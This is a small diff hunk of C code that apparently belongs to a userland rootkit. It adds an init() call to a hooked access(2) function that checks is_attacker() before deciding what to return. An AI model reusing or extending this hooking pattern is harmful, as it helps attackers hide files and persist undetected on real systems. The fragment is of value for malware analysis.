@@ -25,6 +25,7 @@
 #include "hooks.h" /* prototype */
 
 int access(const char *pathname, int mode) {
+    init();
     DEBUG(D_INFO, "called access(2) hook");
 
     if (is_attacker())
